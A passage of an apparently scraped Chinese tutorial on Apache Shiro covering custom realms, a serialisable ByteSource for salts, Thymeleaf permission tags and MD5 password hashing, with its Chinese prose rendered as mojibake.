stream to a byte array.\n     *\n     * @param stream the stream from which to acquire bytes.\n     * @since 1.1\n     */\n    public CustomerByteSource(InputStream stream) {\n        this.bytes = new CustomerByteSource.BytesHelper().getBytes(stream);\n    }\n\n    /**\n     * Returns {@code true} if the specified object is a recognized data type that can be easily converted to\n     * bytes by instances of this class, {@code false} otherwise.\n     * <p/>\n     * This implementation returns {@code true} IFF the specified object is an instance of one of the following\n     * types:\n     * <ul>\n     * <li>{@code byte[]}</li>\n     * <li>{@code char[]}</li>\n     * <li>{@link ByteSource}</li>\n     * <li>{@link String}</li>\n     * <li>{@link File}</li>\n     * </li>{@link InputStream}</li>\n     * </ul>\n     *\n     * @param o the object to test to see if it can be easily converted to bytes by instances of this class.\n     * @return {@code true} if the specified object can be easily converted to bytes by instances of this class,\n     *         {@code false} otherwise.\n     * @since 1.2\n     */\n    public static boolean isCompatible(Object o) {\n        return o instanceof byte[] || o instanceof char[] || o instanceof String ||\n                o instanceof ByteSource || o instanceof File || o instanceof InputStream;\n    }\n\n    public byte[] getBytes() {\n        return this.bytes;\n    }\n\n    public boolean isEmpty() {\n        return this.bytes == null || this.bytes.length == 0;\n    }\n\n    public String toHex() {\n        if ( this.cachedHex == null ) {\n            this.cachedHex = Hex.encodeToString(getBytes());\n        }\n        return this.cachedHex;\n    }\n\n    public String toBase64() {\n        if ( this.cachedBase64 == null ) {\n            this.cachedBase64 = Base64.encodeToString(getBytes());\n        }\n        return this.cachedBase64;\n    }\n\n    public String toString() {\n        return toBase64();\n    }\n\n    public int hashCode() {\n        if (this.bytes == null || this.bytes.length == 0) {\n            return 0;\n        }\n        return Arrays.hashCode(this.bytes);\n    }\n\n    public boolean equals(Object o) {\n        if (o == this) {\n            return true;\n        }\n        if (o instanceof ByteSource) {\n            ByteSource bs = (ByteSource) o;\n            return Arrays.equals(getBytes(), bs.getBytes());\n        }\n        return false;\n    }\n\n    //will probably be removed in Shiro 2.0.  See SHIRO-203:\n    //https://issues.apache.org/jira/browse/SHIRO-203\n    private static final class BytesHelper extends CodecSupport {\n        public byte[] getBytes(File file) {\n            return toBytes(file);\n        }\n\n        public byte[] getBytes(InputStream stream) {\n            return toBytes(stream);\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n\n\nèªå®ä¹ByteSourceä¹åä¿®æ¹çæççæ¹å¼ï¼\n\n@Override\nprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n  System.out.println("====================================");\n  String principal = (String) authenticationToken.getPrincipal();\n\n  System.out.println(principal);\n  // 1. å©ç¨åå­å»æ¥è¯¢æ°æ®åº\n  User user = userService.getUser(principal);\n  if (user != null){\n    System.out.println(user.getId());\n    return new SimpleAuthenticationInfo(\n      user.getUsername(),\n      user.getPassword(),\n      new CustomerByteSource(user.getId().getBytes(StandardCharsets.UTF_8)),\n      this.getName()\n    );\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nè¿éä¸ç¥éä¸ºä»ä¹åªæææçç¼å­ï¼æ²¡æè®¤è¯çç¼å­ï¼å¦å¤ï¼äºæ¬¡ç»éä¼æ¥éã\n\n//TODO\n\n# 10. thymeleaf æéæ§å¶\n\n# 0. å¯¼å¥ä¾èµ\n\n<dependency>\n  <groupId>com.github.theborakompanioni</groupId> \n  <artifactId>thymeleaf-extras-shiro</artifactId> \n  <version>2.0.0</version> \n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 1. å¼å¥åç§°ç©ºé´\n\nxmlns:shiro="http://www.pollix.at/thymeleaf/shiro"\n\n\n1\n\n\n# 2. å¸¸è§çæéæ§å¶æ ç­¾\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦ä¸ºâè®¿å®¢âï¼å³æªè®¤è¯ï¼åå«æªè®°ä½ï¼çç¨æ·ã --\x3e\n<p shiro:guest="">Please <a href="login.html">login</a></p>\n\n\n\x3c!-- è®¤è¯éè¿æå·²è®°ä½çç¨æ·ã --\x3e\n<p shiro:user="">\n    Welcome back John! Not John? Click <a href="login.html">here</a> to login.\n</p>\n\n\x3c!-- å·²è®¤è¯éè¿çç¨æ·ãä¸åå«å·²è®°ä½çç¨æ·ï¼è¿æ¯ä¸useræ ç­¾çåºå«æå¨ã --\x3e\n<p shiro:authenticated="">\n    Hello, <span shiro:principal=""></span>, how are you today?\n</p>\n<a shiro:authenticated="" href="updateAccount.html">Update your contact information</a>\n\n\x3c!-- è¾åºå½åç¨æ·ä¿¡æ¯ï¼éå¸¸ä¸ºç»å½å¸å·ä¿¡æ¯ã --\x3e\n<p>Hello, <shiro:principal/>, how are you today?</p>\n\n\n\x3c!-- æªè®¤è¯éè¿ç¨æ·ï¼ä¸authenticatedæ ç­¾ç¸å¯¹åºãä¸guestæ ç­¾çåºå«æ¯ï¼è¯¥æ ç­¾åå«å·²è®°ä½ç¨æ·ã --\x3e\n<p shiro:notAuthenticated="">\n    Please <a href="login.html">login</a> in order to update your credit card information.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦å±äºè¯¥è§è²ã --\x3e\n<a shiro:hasRole="admin" href="admin.html">Administer the system</a>\x3c!-- æ¥æè¯¥è§è² --\x3e\n\n\x3c!-- ä¸hasRoleæ ç­¾é»è¾ç¸åï¼å½ç¨æ·ä¸å±äºè¯¥è§è²æ¶éªè¯éè¿ã --\x3e\n<p shiro:lacksRole="developer">\x3c!-- æ²¡æè¯¥è§è² --\x3e\n    Sorry, you are not allowed to developer the system.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦å±äºä»¥ä¸ææè§è²ã --\x3e\n<p shiro:hasAllRoles="developer, 2">\x3c!-- è§è²ä¸å¤æ­ --\x3e\n    You are a developer and a admin.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦å±äºä»¥ä¸ä»»æä¸ä¸ªè§è²ã  --\x3e\n<p shiro:hasAnyRoles="admin, vip, developer,1">\x3c!-- è§è²æå¤æ­ --\x3e\n    You are a admin, vip, or developer.\n</p>\n\n\x3c!--éªè¯å½åç¨æ·æ¯å¦æ¥ææå®æéã  --\x3e\n<a shiro:hasPermission="userInfo:add" href="createUser.html">æ·»å ç¨æ·</a>\x3c!-- æ¥ææé --\x3e\n\n\x3c!-- ä¸hasPermissionæ ç­¾é»è¾ç¸åï¼å½åç¨æ·æ²¡æå¶å®æéæ¶ï¼éªè¯éè¿ã --\x3e\n<p shiro:lacksPermission="userInfo:del">\x3c!-- æ²¡ææé --\x3e\n    Sorry, you are not allowed to delete user accounts.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦æ¥æä»¥ä¸ææè§è²ã --\x3e\n<p shiro:hasAllPermissions="userInfo:view, userInfo:add">\x3c!-- æéä¸å¤æ­ --\x3e\n    You can see or add users.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦æ¥æä»¥ä¸ä»»æä¸ä¸ªæéã  --\x3e\n<p shiro:hasAnyPermissions="userInfo:view, userInfo:del">\x3c!-- æéæå¤æ­ --\x3e\n    You can see or delete users.\n</p>\n<a shiro:hasPermission="pp" href="createUser.html">Create a new User</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# 3. å å¥æ¹è¨è§£æ\n\n@Bean(name = "shiroDialect")\npublic ShiroDialect shiroDialect(){\n  return new ShiroDialect();\n}\n\n\n1\n2\n3\n4\n\n\n\n# åèèµæ\n\n 1. Bilibiiliç¼ç¨ä¸è¯äººï¼https://www.bilibili.com/video/BV1uz4y197Zm',normalizedContent:'# shiro\n\nshiro æ¯ä¸ä¸ªåè½å¼ºå¤§ä¸æäºä½¿ç¨çjavaå®å¨æ¡æ¶ï¼å®æ§è¡èº«ä»½éªè¯ãææãå å¯åä¼è¯ç®¡çãä½¿ç¨shiroæäºçè§£çapiï¼æ¨å¯ä»¥å¿«éè½»æ¾å°ä¿æ¤ä»»ä½åºç¨ç¨åºâä»æå°çç§»å¨åºç¨ç¨åºå°æå¤§çwebåä¼ä¸åºç¨ç¨åºã\n\n\n# æéç®¡ç\n\n\n# æéç®¡ççæ¦å¿µ\n\nåºæ¬ä¸æ¶åå°ç¨æ·åä¸çç³»ç»é½è¦è¿è¡æéç®¡çï¼æéç®¡çå±äºç³»ç»å®å¨çèç´ï¼æéç®¡çå®ç°å¯¹ç¨æ·è®¿é®ç³»ç»çæ§å¶ï¼æç§å®å¨è§åæèå®å¨ç­ç¥æ§å¶ç¨æ·å¯ä»¥è®¿é®èä¸åªè½è®¿é®èªå·±è¢«ææçèµæºã\n\næéç®¡çåæ¬ç¨æ·èº«ä»½è®¤è¯åææä¸¤é¨åï¼ç®ç§°è®¤è¯ææãå¯¹äºéè¦è®¿é®æ§å¶çèµæºç¨æ·é¦åç»è¿èº«ä»½è®¤è¯ï¼è®¤è¯éè¿åç¨æ·å·æè¯¥èµæºçè®¿é®æéæ¹å¯è®¿é®ã\n\n\n# èº«ä»½è®¤è¯çæ¦å¿µ\n\nèº«ä»½è®¤è¯ï¼å°±æ¯å¤æ­ä¸ä¸ªç¨æ·æ¯å¦ä¸ºåæ³ç¨æ·çå¤çè¿ç¨ãæå¸¸ç¨çç®åèº«ä»½è®¤è¯æ¹å¼æ¯ç³»ç»éè¿æ ¸å¯¹ç¨æ·è¾å¥çç¨æ·ååå£ä»¤ï¼çå¶æ¯å¦ä¸ç³»ç»ä¸­å­å¨çè¯¥ç¨æ·çç¨æ·ååå£ä»¤ä¸è´ï¼æ¥å¤æ­ç¨æ·èº«ä»½æ¯å¦æ­£ç¡®ãå¯¹äºéç¨æçº¹ç­ç³»ç»ï¼ååºç¤ºæçº¹ï¼å¯¹äºç¡¬ä»¶keyç­å·å¡ç³»ç»ï¼åéè¦å·å¡ã\n\n\n# ææçæ¦å¿µ\n\nææï¼å³è®¿é®æ§å¶ï¼æ§å¶è°è½è®¿é®åªäºèµæºãä¸»ä½è¿è¡èº«ä»½è®¤è¯åéè¦åéæéæ¹å¯è®¿é®ç³»ç»çèµæºï¼å¯¹äºæäºèµæºæ²¡ææéæ¯æ æ³è®¿é®çã\n\n\n# shiroçç®ä»\n\n> apache shiroâ¢ is a powerful and easy-to-use java security framework that performs authentication, authorization, cryptography, and session management. with shiroâs easy-to-understand api, you can quickly and easily secure any application â from the smallest mobile applications to the largest web and enterprise applications.\n> \n> shiro æ¯ä¸ä¸ªåè½å¼ºå¤§ä¸æäºä½¿ç¨çjavaå®å¨æ¡æ¶ï¼å®æ§è¡èº«ä»½éªè¯ãææãå å¯åä¼è¯ç®¡çãä½¿ç¨shiroæäºçè§£çapiï¼æ¨å¯ä»¥å¿«éè½»æ¾å°ä¿æ¤ä»»ä½åºç¨ç¨åºâä»æå°çç§»å¨åºç¨ç¨åºå°æå¤§çwebåä¼ä¸åºç¨ç¨åºã\n> \n> shiroæ¯apacheæä¸ä¸ä¸ªå¼æºæ¡æ¶ï¼å®å°è½¯ä»¶ç³»ç»çå®å¨è®¤è¯ç¸å³çåè½æ½ååºæ¥ï¼å®ç°ç¨æ·èº«ä»½è®¤è¯ï¼æéææãå å¯ãä¼è¯ç®¡çç­åè½ï¼ç»æäºä¸ä¸ªéç¨çå®å¨è®¤è¯æ¡æ¶ã\n\n\n# shiroçæ ¸å¿æ¶æ\n\n\n\n# subject\n\nsubjectå³ä¸»ä½ï¼å¤é¨åºç¨ä¸subjectè¿è¡äº¤äºï¼subjectè®°å½äºå½åæä½ç¨æ·ï¼å°ç¨æ·çæ¦å¿µçè§£ä¸ºå½åæä½çä¸»ä½ï¼å¯è½æ¯ä¸ä¸ªéè¿æµè§å¨è¯·æ±çç¨æ·ï¼ä¹å¯è½æ¯ä¸ä¸ªè¿è¡çç¨åºãsubjectå¨shiroä¸­æ¯ä¸ä¸ªæ¥å£ï¼æ¥å£ä¸­å®ä¹äºå¾å¤è®¤è¯æç¸å³çæ¹æ³ï¼å¤é¨ç¨åºéè¿subjectè¿è¡è®¤è¯æï¼èsubjectæ¯éè¿securitymanagerå®å¨ç®¡çå¨è¿è¡è®¤è¯ææã\n\n# securitymanager\n\nsecuritymanagerå³å®å¨ç®¡çå¨ï¼å¯¹å¨é¨çsubjectè¿è¡å®å¨ç®¡çï¼å®æ¯shiroçæ ¸å¿ï¼è´è´£å¯¹ææçsubjectè¿è¡å®å¨ç®¡çãéè¿securitymanagerå¯ä»¥å®æsubjectçè®¤è¯ãææç­ï¼å®è´¨ä¸securitymanageræ¯éè¿authenticatorè¿è¡è®¤è¯ï¼éè¿authorizerè¿è¡ææï¼éè¿sessionmanagerè¿è¡ä¼è¯ç®¡çç­ã\n\nsecuritymanageræ¯ä¸ä¸ªæ¥å£ï¼ç»§æ¿äºauthenticator, authorizer, sessionmanagerè¿ä¸ä¸ªæ¥å£ã\n\n# authenticator\n\nauthenticatorå³è®¤è¯å¨ï¼å¯¹ç¨æ·èº«ä»½è¿è¡è®¤è¯ï¼authenticatoræ¯ä¸ä¸ªæ¥å£ï¼shiroæä¾modularrealmauthenticatorå®ç°ç±»ï¼éè¿modularrealmauthenticatoråºæ¬ä¸å¯ä»¥æ»¡è¶³å¤§å¤æ°éæ±ï¼ä¹å¯ä»¥èªå®ä¹è®¤è¯å¨ã\n\n# authorizer\n\nauthorizerå³ææå¨ï¼ç¨æ·éè¿è®¤è¯å¨è®¤è¯éè¿ï¼å¨è®¿é®åè½æ¶éè¦éè¿ææå¨å¤æ­ç¨æ·æ¯å¦ææ­¤åè½çæä½æéã\n\n# realm\n\nrealmå³é¢åï¼ç¸å½äºdatasourceæ°æ®æºï¼securitymanagerè¿è¡å®å¨è®¤è¯éè¦éè¿realmè·åç¨æ·æéæ°æ®ï¼æ¯å¦ï¼å¦æç¨æ·èº«ä»½æ°æ®å¨æ°æ®åºé£ä¹realmå°±éè¦ä»æ°æ®åºè·åç¨æ·èº«ä»½ä¿¡æ¯ã\n\næ³¨æï¼ä¸è¦ærealmçè§£æåªæ¯ä»æ°æ®æºåæ°æ®ï¼å¨realmä¸­è¿æè®¤è¯æææ ¡éªçç¸å³çä»£ç ã\n\n# sessionmanager\n\nsessionmanagerå³ä¼è¯ç®¡çï¼shiroæ¡æ¶å®ä¹äºä¸å¥ä¼è¯ç®¡çï¼å®ä¸ä¾èµwebå®¹å¨çsessionï¼æä»¥shiroå¯ä»¥ä½¿ç¨å¨éwebåºç¨ä¸ï¼ä¹å¯ä»¥å°åå¸å¼åºç¨çä¼è¯éä¸­å¨ä¸ç¹ç®¡çï¼æ­¤ç¹æ§å¯ä½¿å®å®ç°åç¹ç»å½ã\n\n# sessiondao\n\nsessiondaoå³ä¼è¯daoï¼æ¯å¯¹sessionä¼è¯æä½çä¸å¥æ¥å£ï¼æ¯å¦è¦å°sessionå­å¨å°æ°æ®åºï¼å¯ä»¥éè¿jdbcå°ä¼è¯å­å¨å°æ°æ®åºã\n\n# cachemanager\n\ncachemanagerå³ç¼å­ç®¡çï¼å°ç¨æ·æéæ°æ®å­å¨å¨ç¼å­ï¼è¿æ ·å¯ä»¥æé«æ§è½ã\n\n# cryptography\n\ncryptographyå³å¯ç ç®¡çï¼shiroæä¾äºä¸å¥å å¯/è§£å¯çç»ä»¶ï¼æ¹ä¾¿å¼åãæ¯å¦æä¾å¸¸ç¨çæ£åãå /è§£å¯ç­åè½ã\n\n\n# shiroè®¤è¯\n\n> èº«ä»½è®¤è¯ï¼å°±æ¯å¤æ­ä¸ä¸ªç¨æ·æ¯å¦ä¸ºåæ³ç¨æ·çå¤çè¿ç¨ãæå¸¸ç¨çç®åèº«ä»½è®¤è¯æ¹å¼æ¯ç³»ç»éè¿æ ¸å¯¹ç¨æ·è¾å¥çç¨æ·ååå£ä»¤ï¼çå¶æ¯å¦ä¸ç³»ç»ä¸­å­å¨çè¯¥ç¨æ·çç¨æ·ååå£ä»¤ä¸è´ï¼æ¥å¤æ­ç¨æ·èº«ä»½æ¯å¦æ­£ç¡®ã\n\n\n# è®¤è¯çç¸å³å¯¹è±¡\n\n# subject ä¸»ä½\n\nè®¿é®ç³»ç»çç¨æ·ï¼ä¸»ä½å¯ä»¥æ¯ç¨æ·ãç¨åºç­ï¼è¿è¡è®¤è¯çé½ç§°ä¸ºä¸»ä½ï¼\n\n# principal èº«ä»½ä¿¡æ¯\n\nä¸»ä½ï¼subjectï¼è¿è¡èº«ä»½è®¤è¯çæ è¯ï¼æ è¯å¿é¡»å·æå¯ä¸æ§ï¼å¦ç¨æ·åãææºå·ãé®ç®±å°åç­ï¼ä¸ä¸ªä¸»ä½å¯ä»¥æå¤ä¸ªèº«ä»½ï¼ä½æ¯å¿é¡»æä¸ä¸ªä¸»èº«ä»½ï¼primary principalï¼ã\n\n# credential å­è¯ä¿¡æ¯\n\nåªæä¸»ä½èªå·±ç¥éçå®å¨ä¿¡æ¯ï¼å¦å¯ç ãè¯ä¹¦ç­ã\n\n\n# è®¤è¯çæµç¨\n\n\n\n\n# å®ç°ä¸ä¸ªæç®åçè®¤è¯\n\n 1. æ·»å shiroçä¾èµï¼æ¬æ¬¡ä½¿ç¨çshiroçæ¬æ¯ï¼shiro1.5.3\n    \n    <dependencies>\n      <dependency>\n        <groupid>org.apache.shiro</groupid>\n        <artifactid>shiro-core</artifactid>\n        <version>1.5.3</version>\n      </dependency>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. å¼å¥shiroéç½®æä»¶ï¼è¿ä¸ªéç½®æä»¶å¨åç»­çæ´åä¸­ç¨ä¸å°ï¼åªæ¯ä¸ºäºå­¦ä¹ ä½¿ç¨çä¸ä¸ªæ¨¡æçåºæ¯ï¼ä»¥åçç¨æ·èº«ä»½ä¿¡æ¯æ¯è¦ä»æ°æ®åºä¸­åçã\n    \n    [users]\n    zhangsan=123456\n    lisi=123.bmk\n    \n    \n    1\n    2\n    3\n    \n\n 3. æµè¯è®¤è¯çä»£ç \n    \n    package com.pwddd.shirodemo;\n    \n    import org.apache.shiro.securityutils;\n    import org.apache.shiro.authc.incorrectcredentialsexception;\n    import org.apache.shiro.authc.unknownaccountexception;\n    import org.apache.shiro.authc.usernamepasswordtoken;\n    import org.apache.shiro.mgt.defaultsecuritymanager;\n    import org.apache.shiro.realm.text.inirealm;\n    import org.apache.shiro.subject.subject;\n    \n    public class testauthenticator {\n        public static void main(string[] args) {\n    \n            // 1. åå»ºsecuritymanager\n            defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n    \n            // 2. åå»ºé»è®¤çinirealm æå®iniéç½®æä»¶çä½ç½®\n            inirealm inirealm = new inirealm("classpath:shiro.ini");\n    \n            // 3. ç»securitymanagerè®¾ç½®ä¸ä¸ªrealm\n            defaultsecuritymanager.setrealm(inirealm);\n    \n            // 4. å°å®å¨å·¥å·ç±»ä¸­è®¾ç½®ä¸ä¸ªå®å¨ç®¡çå¨\n            securityutils.setsecuritymanager(defaultsecuritymanager);\n    \n            // 5. è·åä¸»ä½å¯¹è±¡\n            subject subject = securityutils.getsubject();\n    \n            // 6. æ¨¡æç»éä¿¡æ¯åå»ºä»¤ç\n            usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n    \n            try {\n    \n                // 7. å°è¯ä½¿ç¨ä»¤çç»é\n                subject.login(token);\n                system.out.println("è®¤è¯æå"+subject.isauthenticated());\n            }catch (unknownaccountexception e){\n                system.out.println("ç¨æ·åä¸å­å¨");\n            }catch (incorrectcredentialsexception e){\n                system.out.println("è®¤è¯æªéè¿");\n            }\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\nå¯¹åºçå¼å¸¸åç±»ï¼\n\n * disabledaccountexceptionï¼å¸å·è¢«ç¦ç¨ï¼\n\n * lockedaccountexceptionï¼å¸å·è¢«éå®ï¼\n\n * excessiveattemptsexceptionï¼ç»å½å¤±è´¥æ¬¡æ°è¿å¤ï¼\n\n * expiredcredentialsexceptionï¼å­è¯è¿æï¼ç­\n\n\n# æºç è¿½è¸ªshiroä¸­çè®¤è¯è¿ç¨\n\nç¨æ·åéªè¯çè°ç¨ï¼\n\ndogetauthenticationinfo:162, simpleaccountrealm (org.apache.shiro.realm)\ngetauthenticationinfo:571, authenticatingrealm (org.apache.shiro.realm)\ndosinglerealmauthentication:180, modularrealmauthenticator (org.apache.shiro.authc.pam)\ndoauthenticate:273, modularrealmauthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, abstractauthenticator (org.apache.shiro.authc)\nauthenticate:106, authenticatingsecuritymanager (org.apache.shiro.mgt)\nlogin:275, defaultsecuritymanager (org.apache.shiro.mgt)\nlogin:260, delegatingsubject (org.apache.shiro.subject.support)\nmain:35, testauthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næç»å¨org.apache.shiro.realm.simpleaccountrealm#dogetauthenticationinfoæ ¹æ®tokenä¸­çç¨æ·åå¨å¨å¯¹åºçéç½®æä»¶ä¸­æ¥æ¾å¯¹åºçç¨æ·ï¼æ­¤å¤è¿æ²¡æåå¯ç çæ ¡éªã\n\n\n\nå¯ç æ ¡éªçè°ç¨ï¼\n\ndocredentialsmatch:127, simplecredentialsmatcher (org.apache.shiro.authc.credential)\nassertcredentialsmatch:600, authenticatingrealm (org.apache.shiro.realm)\ngetauthenticationinfo:581, authenticatingrealm (org.apache.shiro.realm)\ndosinglerealmauthentication:180, modularrealmauthenticator (org.apache.shiro.authc.pam)\ndoauthenticate:273, modularrealmauthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, abstractauthenticator (org.apache.shiro.authc)\nauthenticate:106, authenticatingsecuritymanager (org.apache.shiro.mgt)\nlogin:275, defaultsecuritymanager (org.apache.shiro.mgt)\nlogin:260, delegatingsubject (org.apache.shiro.subject.support)\nmain:35, testauthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næç»å¨org.apache.shiro.authc.credential.simplecredentialsmatcher#docredentialsmatchä¸­éªè¯å¯ç æ¯å¦å¹éã\n\n\n\nshiroä¸­çrealmçç±»ç»æå¦ä¸ï¼\n\n\n\næ ¹æ®æºç åç°ï¼è®¤è¯ä½¿ç¨çæ¯simpleaccountrealm\n\n\n\nå¨simpleaccountrealmæä¸¤ä¸ªæ¹æ³ï¼ä¸ä¸ªæ¯ç¨æ¥è®¤è¯çï¼å¦ä¸ä¸ªæ¯ç¨æ¥ææçã\n\npublic class simpleaccountrealm extends authorizingrealm {\n  //.......çç¥\n  protected authenticationinfo dogetauthenticationinfo(authenticationtoken token) throws authenticationexception {\n    usernamepasswordtoken uptoken = (usernamepasswordtoken) token;\n    simpleaccount account = getuser(uptoken.getusername());\n\n    if (account != null) {\n\n      if (account.islocked()) {\n        throw new lockedaccountexception("account [" + account + "] is locked.");\n      }\n      if (account.iscredentialsexpired()) {\n        string msg = "the credentials for account [" + account + "] are expired";\n        throw new expiredcredentialsexception(msg);\n      }\n\n    }\n\n    return account;\n  }\n\n  protected authorizationinfo dogetauthorizationinfo(principalcollection principals) {\n    string username = getusername(principals);\n    users_lock.readlock().lock();\n    try {\n      return this.users.get(username);\n    } finally {\n      users_lock.readlock().unlock();\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# èªå®ä¹çrealm\n\nå¨ä¸é¢çç¨åºä¸­ï¼æä»¬ä½¿ç¨çshiroèªå¸¦çinirealmï¼å¹¶ä¸ç¨æ·åå¯ç æ¯å¨å­å°iniéç½®æä»¶ä¸­çï¼å¨å¤§é¨åçæåµä¸ï¼æä»¬éè¦ä»ç³»ç»çæ°æ®åºä¸­è¯»åç¸å³çç¨æ·ä¿¡æ¯ï¼å æ­¤éè¦èªå®ä¹realmã\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authenticatingrealm;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\n\npublic class customerrealm extends authorizingrealm {\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        return null;\n    }\n\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        string principal = (string) authenticationtoken.getprincipal();\n        if ("zhangsan".equals(principal)){\n          \n          \t// è¿éæ¨¡æä»æ°æ®åºä¸­æ¥è¯¢è·åå°çç¨æ·ååå¯ç \n            simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo("zhangsan", "123", this.getname());\n            return authenticationinfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nèªå®ä¹realmçæµè¯æ¹æ³ï¼\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.customerrealm;\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.mgt.defaultsecuritymanager;\nimport org.apache.shiro.subject.subject;\n\npublic class testcustomerrealm {\n    public static void main(string[] args) {\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n        defaultsecuritymanager.setrealm(new customerrealm());\n\n        securityutils.setsecuritymanager(defaultsecuritymanager);\n\n        subject subject = securityutils.getsubject();\n\n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123");\n\n\n        try {\n            subject.login(token);\n        } catch (authenticationexception e) {\n            e.printstacktrace();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n# ä½¿ç¨md5å å¯åç\n\n> å¨ä¸é¢çæµè¯ä¸­ï¼æä»¬ä¸ç´ä½¿ç¨çæ¯ææå¯ç çæ¹å¼ï¼è¿ç§æ¹å¼æå¾å¤§çå®å¨éæ£ï¼åæä»¬ä½¿ç¨å®å¨æ¡æ¶çåè¡·ç¸èç¦»ãå¨å®éçåºæ¯ä¸­ï¼ä¸è¬æ¯å¨æ³¨åé¶æ®µï¼å°ç¨æ·è®¾ç½®çå¯ç å çç¶åæ£åå­å¨å°æ°æ®åºä¸­ï¼ç¶åä½¿ç¨shiroä»æ°æ®åºä¸­è¯»ååºçåç§æï¼å®æå¯ç æ ¡éªã\n\n# md5æµè¯\n\npackage com.pwddd.shirodemo;\n\nimport org.apache.shiro.crypto.hash.md5hash;\n\npublic class testmd5 {\n  public static void main(string[] args) {\n\n    md5hash hash = new md5hash();\n    hash.setbytes("123456".getbytes());\n    system.out.println(hash.tohex()); // 313233343536\n\n\n    // md5å å¯\n    md5hash md5hash = new md5hash("123456");\n    system.out.println(md5hash.tohex()); // e10adc3949ba59abbe56e057f20f883e\n    // å ç\n    md5hash md5hashwithsalt = new md5hash("123456","123/bmk#");\n    system.out.println(md5hashwithsalt.tohex()); //a43ebab3045680d4b3d6c5ccac659d10\n\n    //æ£å\n    md5hash hashinter = new md5hash("123456", "123/bmk#", 1024);\n    system.out.println(hashinter.tohex()); //a991e133559f1891893b60a3c04e8740\n\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# èªå®ä¹realmå®ç°md5\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport 